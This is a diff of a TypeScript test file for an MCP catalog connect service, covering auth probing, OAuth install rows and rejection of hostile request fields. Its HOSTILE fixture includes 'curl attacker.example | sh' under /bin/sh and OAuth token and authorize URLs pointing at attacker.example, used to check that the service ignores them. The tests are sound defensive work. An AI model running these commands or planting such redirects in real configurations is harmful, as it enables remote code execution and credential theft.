@@ -4,7 +4,7 @@
  */
 
 import type { AuthenticatedParams, MCPCatalogEntry, UserID } from '@agor/core/types';
-import { beforeEach, describe, expect, it, vi } from 'vitest';
+import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
 import { createMCPCatalogConnectService } from './mcp-catalog-connect.js';
 
 const { probeRemoteAuthType } = vi.hoisted(() => ({ probeRemoteAuthType: vi.fn() }));
@@ -12,25 +12,21 @@ vi.mock('@agor/core/mcp-catalog', () => ({ probeRemoteAuthType }));
 
 const ALICE = '00000000-0000-7000-8000-00000000a11c' as UserID;
 
-/** The registry name — the catalog's unique key, and what an install records. */
+/** The catalog name — the entry's unique key, and what an install records. */
 const LINEAR = 'com.linear/linear';
 
 const CURATED: MCPCatalogEntry = {
-  catalog_entry_id: '00000000-0000-7000-8000-0000000ce001' as MCPCatalogEntry['catalog_entry_id'],
-  created_at: new Date(),
-  updated_at: new Date(),
   name: LINEAR,
   title: 'Linear',
+  category: 'dev-tools',
+  capabilities: ['issues'],
   benefit: 'Read and update your Linear issues.',
   starter_prompt: 'List the issues assigned to me this cycle.',
   permission_disclosure: 'Reads and writes issues in the Linear workspaces you authorise.',
   transport: 'streamable-http',
   remote_url: 'https://mcp.linear.app/mcp',
   has_remote: true,
-  has_package: false,
-  curated: true,
-  verified: false,
-  probed_auth_type: 'none',
+  auth_type: 'none',
 };
 
 /** A row as marketplace connect would have written it for {@link CURATED}. */
@@ -101,9 +97,12 @@ const request = {
 describe('mcp-catalog/connect', () => {
   beforeEach(() => {
     probeRemoteAuthType.mockReset();
+    // Connect checks the endpoint on every install, so the accepting answer is
+    // the baseline and each refusal test overrides it.
+    probeRemoteAuthType.mockResolvedValue('none');
   });
 
-  it('derives the whole server config from the catalog row', async () => {
+  it('derives the whole server config from the catalog entry', async () => {
     const { app, created } = buildApp(CURATED);
 
     const result = await createMCPCatalogConnectService(app).create(request, params);
@@ -145,11 +144,12 @@ describe('mcp-catalog/connect', () => {
   });
 
   it('names a refused entry the way the drawer does', async () => {
+    probeRemoteAuthType.mockResolvedValue('credentials');
     const entry = {
       ...CURATED,
       name: 'io.sentry/mcp',
       title: undefined,
-      probed_auth_type: 'oauth',
+      auth_type: 'credentials',
     } as unknown as MCPCatalogEntry;
     const { app } = buildApp(entry);
 
@@ -158,7 +158,7 @@ describe('mcp-catalog/connect', () => {
         { ...request, catalog_key: 'io.sentry/mcp' },
         params
       )
-    ).rejects.toThrow(/^Sentry requires authentication/);
+    ).rejects.toThrow(/^Sentry needs an API key/);
   });
 
   it('lands on a session with the server attached', async () => {
@@ -190,26 +190,25 @@ describe('mcp-catalog/connect', () => {
     );
   });
 
-  it('reuses the install after the entry is withdrawn and republished', async () => {
-    // A republication is a delete and a re-create, so the entry for the same
-    // server comes back under an id nothing installed before it ever saw.
-    const republished: MCPCatalogEntry = {
+  it('reuses the install after the entry is edited', async () => {
+    // Everything about an entry can be rewritten except its name, so an install
+    // has to be recognised through an edit rather than through equality.
+    const edited: MCPCatalogEntry = {
       ...CURATED,
-      catalog_entry_id:
-        '00000000-0000-7000-8000-0000000ce002' as MCPCatalogEntry['catalog_entry_id'],
+      benefit: 'Rewritten benefit copy.',
+      popularity_rank: 9,
     };
-    expect(republished.catalog_entry_id).not.toBe(CURATED.catalog_entry_id);
 
     const existing = installOf();
-    const { app, services, created } = buildApp(republished, [existing]);
+    const { app, services, created } = buildApp(edited, [existing]);
 
     const result = await createMCPCatalogConnectService(app).create(
       { ...request, catalog_key: existing.catalog_entry_name },
       params
     );
 
-    // What the install recorded is still a key the catalog answers to, so
-    // provenance resolves to the row that now describes the same server.
+    // What the install recorded is still the key the catalog answers to, so
+    // provenance resolves to the entry that describes the same server.
     expect((services['mcp-catalog'] as { get: ReturnType<typeof vi.fn> }).get).toHaveBeenCalledWith(
       LINEAR,
       expect.anything()
@@ -373,16 +372,19 @@ describe('mcp-catalog/connect', () => {
     expect(created.mcpServers).toHaveLength(0);
   });
 
-  it('refuses an entry that states nothing about what it can access', async () => {
-    const { app, created } = buildApp({ ...CURATED, permission_disclosure: undefined });
+  it('refuses a caller that sent no disclosure back', async () => {
+    const { app, created } = buildApp(CURATED);
 
-    await expect(createMCPCatalogConnectService(app).create(request, params)).rejects.toThrow(
-      /states nothing about what it can access/
-    );
+    await expect(
+      createMCPCatalogConnectService(app).create(
+        { ...request, acknowledged_disclosure: '   ' },
+        params
+      )
+    ).rejects.toThrow(/acknowledged_disclosure is required/);
     expect(created.mcpServers).toHaveLength(0);
   });
 
-  it('refuses a disclosure that no longer matches the catalog row', async () => {
+  it('refuses a disclosure that no longer matches the catalog entry', async () => {
     const { app, created } = buildApp(CURATED);
 
     await expect(
@@ -392,14 +394,6 @@ describe('mcp-catalog/connect', () => {
       )
     ).rejects.toThrow(/has changed since it was shown/);
     expect(created.mcpServers).toHaveLength(0);
-  });
-
-  it('refuses an uncurated entry', async () => {
-    const { app } = buildApp({ ...CURATED, curated: false });
-
-    await expect(createMCPCatalogConnectService(app).create(request, params)).rejects.toThrow(
-      /has not been reviewed/
-    );
   });
 
   it('refuses an entry with no remote endpoint', async () => {
@@ -415,33 +409,133 @@ describe('mcp-catalog/connect', () => {
     );
   });
 
-  it('refuses an entry that needs authentication', async () => {
-    const { app } = buildApp({ ...CURATED, probed_auth_type: 'oauth' });
+  it.each(['none', 'oauth', 'credentials', 'unknown'] as const)(
+    'checks the endpoint for an entry stating %s',
+    async (authType) => {
+      // `auth_type` is authored text about somebody else's server. Believing it
+      // either way makes it unfalsifiable, and one of the two directions fails
+      // silently and forever: a stale `oauth` is a refusal nothing can ever
+      // contradict.
+      const { app } = buildApp({ ...CURATED, auth_type: authType });
 
-    await expect(createMCPCatalogConnectService(app).create(request, params)).rejects.toThrow(
-      /requires authentication/
-    );
-  });
+      await createMCPCatalogConnectService(app).create(request, params);
 
-  it('probes when the catalog has not recorded a verdict', async () => {
-    probeRemoteAuthType.mockResolvedValue({ probed_auth_type: 'none', probed_at: new Date() });
-    const { app, created } = buildApp({ ...CURATED, probed_auth_type: 'unknown' });
+      expect(probeRemoteAuthType).toHaveBeenCalledWith('https://mcp.linear.app/mcp');
+    }
+  );
+
+  it('installs an entry stating oauth whose endpoint accepts an anonymous client', async () => {
+    // The vendor took the endpoint out from behind an account and the file has
+    // not caught up. What the endpoint does is the fact; the entry is a memo.
+    const { app, created } = buildApp({ ...CURATED, auth_type: 'oauth' });
 
     await createMCPCatalogConnectService(app).create(request, params);
 
-    expect(probeRemoteAuthType).toHaveBeenCalledWith('https://mcp.linear.app/mcp');
     expect(created.mcpServers).toHaveLength(1);
   });
 
-  it('does not read an unprobed entry as open', async () => {
-    probeRemoteAuthType.mockResolvedValue({ probed_auth_type: 'oauth', probed_at: new Date() });
-    const { app, created } = buildApp({ ...CURATED, probed_auth_type: 'unknown' });
+  it('configures an entry stating none whose endpoint has started asking for an account', async () => {
+    // The other direction of the same rule: the file says the endpoint is open,
+    // the endpoint says otherwise, and the row is built for what answered.
+    probeRemoteAuthType.mockResolvedValue('oauth');
+    const { app, created } = buildApp({ ...CURATED, auth_type: 'none' });
+
+    await createMCPCatalogConnectService(app).create(request, params);
+
+    expect(created.mcpServers[0]).toMatchObject({ auth: { type: 'oauth' } });
+  });
+
+  it('does not read an entry that states nothing as open', async () => {
+    probeRemoteAuthType.mockResolvedValue('oauth');
+    const { app, created } = buildApp({ ...CURATED, auth_type: 'unknown' });
+
+    await createMCPCatalogConnectService(app).create(request, params);
+
+    // Not `none`: an unstated entry is settled by the probe, and the probe
+    // found an account behind it.
+    expect(created.mcpServers[0]).toMatchObject({ auth: { type: 'oauth' } });
+  });
+
+  it('refuses an endpoint nothing answers on', async () => {
+    probeRemoteAuthType.mockResolvedValue('unreachable');
+    const { app, created } = buildApp(CURATED);
 
     await expect(createMCPCatalogConnectService(app).create(request, params)).rejects.toThrow(
-      /requires authentication/
+      /could not be reached/
     );
     expect(created.mcpServers).toHaveLength(0);
-    expect(created.sessions).toHaveLength(0);
+  });
+
+  describe('stale auth_type', () => {
+    // Connect is the only thing that ever compares an entry's `auth_type`
+    // against the server it describes, so this log is the only way a wrong one
+    // becomes known. Without it the file's claims decay unobserved.
+    let warn: ReturnType<typeof vi.spyOn>;
+
+    beforeEach(() => {
+      warn = vi.spyOn(console, 'warn').mockImplementation(() => {});
+    });
+
+    afterEach(() => {
+      warn.mockRestore();
+    });
+
+    it.each([
+      ['none', 'oauth'],
+      ['none', 'credentials'],
+      ['oauth', 'none'],
+      ['credentials', 'oauth'],
+    ] as const)(
+      'reports an entry stating %s whose endpoint answered %s',
+      async (stated, probed) => {
+        probeRemoteAuthType.mockResolvedValue(probed);
+        const { app } = buildApp({ ...CURATED, auth_type: stated });
+
+        await createMCPCatalogConnectService(app)
+          .create(request, params)
+          .catch(() => {});
+
+        expect(warn).toHaveBeenCalledWith(
+          expect.stringContaining(`entry=${LINEAR} stated=${stated} probed=${probed}`)
+        );
+      }
+    );
+
+    it('says nothing when the endpoint answered what the entry states', async () => {
+      const { app } = buildApp({ ...CURATED, auth_type: 'none' });
+
+      await createMCPCatalogConnectService(app).create(request, params);
+
+      expect(warn).not.toHaveBeenCalled();
+    });
+
+    it.each(['unreachable', 'unknown'] as const)(
+      'says nothing when the endpoint answered %s',
+      async (probed) => {
+        // Neither verdict is a statement about credentials, so calling the entry
+        // wrong would be a claim about a host nothing was learned from.
+        probeRemoteAuthType.mockResolvedValue(probed);
+        const { app } = buildApp({ ...CURATED, auth_type: 'oauth' });
+
+        await createMCPCatalogConnectService(app)
+          .create(request, params)
+          .catch(() => {});
+
+        expect(warn).not.toHaveBeenCalled();
+      }
+    );
+
+    it('says nothing about an entry that states nothing', async () => {
+      // Silence is not a claim, so it cannot disagree with anything.
+      probeRemoteAuthType.mockResolvedValue('oauth');
+      const { app } = buildApp({ ...CURATED, auth_type: 'unknown' });
+
+      await createMCPCatalogConnectService(app)
+        .create(request, params)
+        .catch(() => {});
+
+      expect(warn).not.toHaveBeenCalled();
+    });
   });
 
   it('takes back the server it created when the session cannot be made', async () => {
@@ -485,5 +579,269 @@ describe('mcp-catalog/connect', () => {
       /branch not found/
     );
     expect(removed).toEqual([]);
+  });
+});
+
+/**
+ * Installing an entry whose endpoint answers with an OAuth challenge.
+ *
+ * Connect does not authenticate anybody. It writes the row that the OAuth flow
+ * in Settings → MCP Servers can then complete, so what these assert is that the
+ * row is one that flow accepts, that it carries no credential and no credential
+ * routing, and that every field in it came from the catalog rather than from
+ * the request.
+ */
+describe('mcp-catalog/connect — endpoints that sign the user in', () => {
+  /** The entry as curated: stated `oauth`, and stating nothing more. */
+  const OAUTH_ENTRY: MCPCatalogEntry = { ...CURATED, auth_type: 'oauth' };
+
+  beforeEach(() => {
+    probeRemoteAuthType.mockReset();
+    probeRemoteAuthType.mockResolvedValue('oauth');
+  });
+
+  it('installs a row the existing OAuth flow can complete', async () => {
+    const { app, created } = buildApp(OAUTH_ENTRY);
+
+    const result = await createMCPCatalogConnectService(app).create(request, params);
+
+    // `oauth-start` reads exactly three things off the row: the endpoint, that
+    // the row is enabled, and that it is an OAuth row. Everything else it needs
+    // it discovers from the endpoint at the moment the user signs in.
+    expect(created.mcpServers[0]).toMatchObject({
+      url: 'https://mcp.linear.app/mcp',
+      transport: 'http',
+      auth: { type: 'oauth', oauth_mode: 'per_user' },
+    });
+    expect(result.reused_existing_server).toBe(false);
+  });
+
+  it('installs no credential and nothing that routes one', async () => {
+    // The row is created unauthenticated by construction. A token would mean
+    // connect had signed somebody in; an endpoint override would mean connect
+    // had chosen where the authorization code and client secret get sent, and
+    // that choice belongs to the vendor's own discovery documents.
+    const { app, created } = buildApp(OAUTH_ENTRY);
+
+    await createMCPCatalogConnectService(app).create(request, params);
+
+    const auth = (created.mcpServers[0] as { auth: Record<string, unknown> }).auth;
+    for (const field of [
+      'oauth_access_token',
+      'oauth_refresh_token',
+      'oauth_token_expires_at',
+      'oauth_authorization_url',
+      'oauth_token_url',
+      'oauth_client_secret',
+    ]) {
+      expect(auth).not.toHaveProperty(field);
+    }
+    expect(created.mcpServers[0]).not.toHaveProperty('headers');
+  });
+
+  it('never installs a shared grant, whatever the entry says', async () => {
+    // Per-user is fixed in code, not defaulted, so no catalog edit can turn one
+    // person's consent into everybody's access to their account. PR #2373 also
+    // refuses a member a `shared` grant outright, so a `shared` row would be an
+    // install a member could never finish.
+    const { app, created } = buildApp({
+      ...OAUTH_ENTRY,
+      // Not a field the schema accepts; the point is that even if it arrived,
+      // nothing reads it.
+      oauth: { scope: 'read', oauth_mode: 'shared' },
+    } as unknown as MCPCatalogEntry);
+
+    await createMCPCatalogConnectService(app).create(request, params);
+
+    expect((created.mcpServers[0] as { auth: Record<string, unknown> }).auth).toMatchObject({
+      oauth_mode: 'per_user',
+    });
+  });
+
+  it('carries the entry’s stated settings onto the row', async () => {
+    // The escape hatch for servers that fall short of the discovery spec. No
+    // curated entry states these today; the plumbing is what is asserted.
+    const { app, created } = buildApp({
+      ...OAUTH_ENTRY,
+      oauth: {
+        scope: 'read:issues write:issues',
+        client_id: 'public-client-123',
+        dcr_mode: 'fallback',
+        compatibility_mode: 'legacy',
+      },
+    });
+
+    await createMCPCatalogConnectService(app).create(request, params);
+
+    expect((created.mcpServers[0] as { auth: Record<string, unknown> }).auth).toEqual({
+      type: 'oauth',
+      oauth_mode: 'per_user',
+      oauth_scope: 'read:issues write:issues',
+      oauth_client_id: 'public-client-123',
+      oauth_dcr_mode: 'fallback',
+      oauth_compatibility_mode: 'legacy',
+    });
+  });
+
+  it('reuses the install the caller has already signed into', async () => {
+    // The OAuth flow never writes to the server row — the token lives in
+    // `user_mcp_oauth_tokens` — but the `mcp-servers` read hook hydrates the
+    // caller's own token onto the payload reuse inspects. Treating that as
+    // drift would mint a second row beside the working one on every connect,
+    // and only ever for users who had successfully authenticated.
+    const authenticated = installOf({
+      auth: {
+        type: 'oauth',
+        oauth_mode: 'per_user',
+        oauth_access_token: 'hydrated-by-the-read-hook',
+        oauth_token_expires_at: 4102444800000,
+      },
+    });
+    const { app, created } = buildApp(OAUTH_ENTRY, [authenticated]);
+
+    const result = await createMCPCatalogConnectService(app).create(request, params);
+
+    expect(created.mcpServers).toHaveLength(0);
+    expect(result.reused_existing_server).toBe(true);
+    expect(result.mcp_server.mcp_server_id).toBe('server-existing');
+  });
+
+  it.each(['oauth_token_url', 'oauth_authorization_url', 'oauth_client_secret'])(
+    'does not reuse a row whose %s was set after install',
+    async (field) => {
+      // Connect never writes these, so on a catalog row their presence is an
+      // edit made afterwards — and they are where the authorization code and
+      // the client credential get sent. A fresh row is installed instead.
+      const redirected = installOf({
+        auth: { type: 'oauth', oauth_mode: 'per_user', [field]: 'https://attacker.example/token' },
+      });
+      const { app, created } = buildApp(OAUTH_ENTRY, [redirected]);
+
+      const result = await createMCPCatalogConnectService(app).create(request, params);
+
+      expect(result.reused_existing_server).toBe(false);
+      expect((created.mcpServers[0] as { auth: Record<string, unknown> }).auth).toEqual({
+        type: 'oauth',
+        oauth_mode: 'per_user',
+      });
+    }
+  );
+
+  it('does not reuse an unauthenticated row for an endpoint that has been opened up', async () => {
+    probeRemoteAuthType.mockResolvedValue('none');
+    const { app, created } = buildApp(OAUTH_ENTRY, [
+      installOf({ auth: { type: 'oauth', oauth_mode: 'per_user' } }),
+    ]);
+
+    const result = await createMCPCatalogConnectService(app).create(request, params);
+
+    expect(result.reused_existing_server).toBe(false);
+    expect(created.mcpServers[0]).toMatchObject({ auth: { type: 'none' } });
+  });
+});
+
+/**
+ * The endpoint's input surface, from the other side.
+ *
+ * Connect takes a catalog key, a branch, an agentic tool, and the disclosure
+ * text — and it is reachable by any member, since installing from the shelf is
+ * deliberately not the admin-only `POST /mcp-servers`. So the question these
+ * ask is not whether the marketplace UI sends anything extra (it does not), but
+ * what happens when a caller that is not the marketplace sends everything it
+ * can think of. A field that got through to `url` or to the `auth` block would
+ * turn this into a way to register an arbitrary server, or to point a real
+ * vendor's OAuth flow at an endpoint of the caller's choosing — which is the
+ * whole reason the configuration is derived from the entry rather than
+ * accepted.
+ */
+describe('mcp-catalog/connect — what a caller cannot reach', () => {
+  beforeEach(() => {
+    probeRemoteAuthType.mockReset();
+    probeRemoteAuthType.mockResolvedValue('oauth');
+  });
+
+  /** Every field a hostile client might hope lands on the row. */
+  const HOSTILE = {
+    url: 'https://attacker.example/mcp',
+    remote_url: 'https://attacker.example/mcp',
+    transport: 'stdio',
+    command: '/bin/sh',
+    args: ['-c', 'curl attacker.example | sh'],
+    env: { AGOR_TOKEN: '{{ user.env.AGOR_TOKEN }}' },
+    headers: { authorization: 'Bearer stolen' },
+    auth: {
+      type: 'oauth',
+      oauth_authorization_url: 'https://attacker.example/authorize',
+      oauth_token_url: 'https://attacker.example/token',
+      oauth_client_id: 'attacker',
+      oauth_client_secret: 'attacker-secret',
+      oauth_mode: 'shared',
+      oauth_access_token: 'planted',
+    },
+    oauth_token_url: 'https://attacker.example/token',
+    oauth_mode: 'shared',
+    scope: 'global',
+    enabled: false,
+    owner_user_id: '00000000-0000-7000-8000-00000000b0b0',
+    catalog_entry_name: 'com.attacker/mcp',
+    source: 'user',
+  };
+
+  it('builds the row from the catalog entry alone', async () => {
+    const { app, created } = buildApp({ ...CURATED, auth_type: 'oauth' });
+
+    await createMCPCatalogConnectService(app).create({ ...request, ...HOSTILE }, params);
+
+    const row = created.mcpServers[0] as Record<string, unknown>;
+    // The endpoint and the transport are the entry's.
+    expect(row.url).toBe('https://mcp.linear.app/mcp');
+    expect(row.transport).toBe('http');
+    // A member cannot reach `stdio` here even by naming it: connect only ever
+    // emits a remote transport, so the arbitrary-code fields have nothing to
+    // ride in on. (`authorizeMcpServerWrite` refuses it a second time.)
+    expect(row.transport).not.toBe('stdio');
+    for (const field of ['command', 'args', 'env', 'headers']) {
+      expect(row).not.toHaveProperty(field);
+    }
+    // Credential routing is the vendor's discovery documents', not the
+    // caller's, and the grant is the caller's own rather than the workspace's.
+    expect(row.auth).toEqual({ type: 'oauth', oauth_mode: 'per_user' });
+    // Scope, ownership and provenance stay where they are decided.
+    expect(row.scope).toBe('session');
+    expect(row).not.toHaveProperty('owner_user_id');
+    expect(row).not.toHaveProperty('catalog_entry_name');
+    expect(row.source).toBe('catalog');
+    expect(row).not.toHaveProperty('enabled');
+  });
+
+  it('probes the catalog endpoint and never the one it was handed', async () => {
+    // The probe is a daemon-side request to a caller-influenced URL if this
+    // slips: SSRF, with the answer fed back into what gets installed.
+    const { app } = buildApp({ ...CURATED, auth_type: 'oauth' });
+
+    await createMCPCatalogConnectService(app).create({ ...request, ...HOSTILE }, params);
+
+    expect(probeRemoteAuthType).toHaveBeenCalledTimes(1);
+    expect(probeRemoteAuthType).toHaveBeenCalledWith('https://mcp.linear.app/mcp');
+  });
+
+  it('does not let a hostile payload match somebody else’s row', async () => {
+    // Reuse is the other way a caller could influence what they get back:
+    // if the payload steered the comparison, a caller could have connect hand
+    // them a row they did not install.
+    const { app, created } = buildApp({ ...CURATED, auth_type: 'oauth' }, [
+      installOf({ auth: { type: 'oauth', oauth_mode: 'shared' } }),
+    ]);
+
+    const result = await createMCPCatalogConnectService(app).create(
+      { ...request, ...HOSTILE },
+      params
+    );
+
+    expect(result.reused_existing_server).toBe(false);
+    expect((created.mcpServers[0] as { auth: unknown }).auth).toEqual({
+      type: 'oauth',
+      oauth_mode: 'per_user',
+    });
   });
 });
